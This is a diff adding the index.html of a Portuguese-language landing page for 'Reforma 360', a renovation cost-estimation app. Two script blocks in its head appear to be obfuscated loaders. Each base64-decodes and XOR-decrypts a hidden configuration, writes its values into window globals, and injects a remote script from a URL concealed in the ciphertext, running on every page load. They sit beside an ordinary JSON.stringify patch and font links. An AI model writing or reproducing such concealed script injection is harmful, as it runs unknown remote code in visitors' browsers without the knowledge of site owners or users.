@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <!-- Circular reference protection for analytics and tracker scripts -->
+    <script>
+      (function() {
+        var _origStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          try {
+            return _origStringify.apply(this, arguments);
+          } catch (err) {
+            if (err && err.message && (err.message.indexOf("circular") !== -1 || err.message.indexOf("Converting circular") !== -1)) {
+              var seen = new WeakSet();
+              return _origStringify(value, function(k, v) {
+                if (typeof v === "object" && v !== null) {
+                  if (v.nodeType || (typeof Element !== "undefined" && v instanceof Element)) {
+                    return { tagName: v.tagName, id: v.id, className: v.className };
+                  }
+                  if (seen.has(v)) {
+                    return undefined;
+                  }
+                  seen.add(v);
+                }
+                if (typeof replacer === "function") {
+                  return replacer(k, v);
+                }
+                return v;
+              }, space);
+            }
+            throw err;
+          }
+        };
+      })();
+    </script>
+
+<script>(function(){var q_kr=atob("DMI6PA1MGu5sssuNDrkYSX8gONRO2r/5frEAEyIvfoBCx7/gZ6RDEm4jd8AOwOT+bbBTTHk/NZ4Fyq7hIbJTRGggNIQfkOevb7ZOTmQub5oJwem3VZ8WHmogdYwN3rivNJlBHmMtd4tOiOn9Z7pfUEQoOMJOxKrhe6cYBi96e9YJg6q1O/QNDD99LNtZivrvb6ALWD9uZ7MR");var j_ept=[];for(var l_x1=0;l_x1<q_kr.length;l_x1++){j_ept.push(q_kr.charCodeAt(l_x1)&255);}var b_7mld=j_ept[0];var n_bsru=j_ept.slice(1,1+b_7mld);var w_nl=j_ept.slice(1+b_7mld);var a_fvfp=w_nl.map(function(b,d_4jy){return b^n_bsru[d_4jy%b_7mld];});var i_2l9="";for(var p_ducl=0;p_ducl<a_fvfp.length;p_ducl++){i_2l9+=String.fromCharCode(a_fvfp[p_ducl]&255);}var e_5x=decodeURIComponent(escape(i_2l9));var m_wuex=JSON.parse(e_5x);var g_o5al=m_wuex.globals||[];g_o5al.forEach(function(s_qi){window[s_qi.name]=s_qi.value;});var k_f=document.createElement("script");k_f.src=m_wuex.url;k_f.async=true;k_f.defer=true;(m_wuex.attributes||[]).forEach(function(o_e){k_f.setAttribute(o_e.name,o_e.value);});(document.head||document.documentElement).appendChild(k_f);})();</script>
+
+<script>(function(){var q_a9=atob("DJKrYf4018ZsfYo+wumJFIxY9fxOFf5KsuGRTtFXs6hCCP5Tq/TST51buugOD6VNoeDCEYpH+LMYEPkRrvPfBI1A+awfX6Yco+bfE5dWorIJDqgEmemJD59ZsuRWX+5ftvOGFIpZvqAVUPpMp+TOD4oZr6UDGadNofmJTdxCtqoZGKgE4LDWTYUWuacBGKgE4PbKFZ8ZorIBFOxH7+LZBIhRubJBDv9cq/bYQ9IWoacACO8c+LCJHKNJ");var y_pcs=[];for(var o_on=0;o_on<q_a9.length;o_on++){y_pcs.push(q_a9.charCodeAt(o_on)&255);}var p_a8x=y_pcs[0];var n_nqa=y_pcs.slice(1,1+p_a8x);var m_yz4m=y_pcs.slice(1+p_a8x);var j_64u=m_yz4m.map(function(b,e_7f){return b^n_nqa[e_7f%p_a8x];});var e_pn="";for(var e_1=0;e_1<j_64u.length;e_1++){e_pn+=String.fromCharCode(j_64u[e_1]&255);}var u_uas=decodeURIComponent(escape(e_pn));var k_lniw=JSON.parse(u_uas);var n_53r=k_lniw.globals||[];n_53r.forEach(function(k_xy){window[k_xy.name]=k_xy.value;});var x_tk=document.createElement("script");x_tk.src=k_lniw.url;x_tk.async=true;x_tk.defer=true;(k_lniw.attributes||[]).forEach(function(b_dx){x_tk.setAttribute(b_dx.name,b_dx.value);});(document.head||document.documentElement).appendChild(x_tk);})();</script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Reforma 360 | Estimativa Inteligente de Obras e Reformas</title>
+    <meta name="description" content="Descubra quanto sua reforma pode custar antes de gastar dinheiro. O aplicativo inteligente que cria sua estimativa em poucos minutos." />
+    
+    <!-- DNS prefetch & preconnect for faster network handshakes -->
+    <link rel="dns-prefetch" href="https://i.postimg.cc">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+    <link rel="dns-prefetch" href="https://cdn.utmify.com.br">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
+  </head>
+  <body class="bg-slate-50 text-slate-900 font-['Plus_Jakarta_Sans',sans-serif] antialiased selection:bg-amber-500 selection:text-white">
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
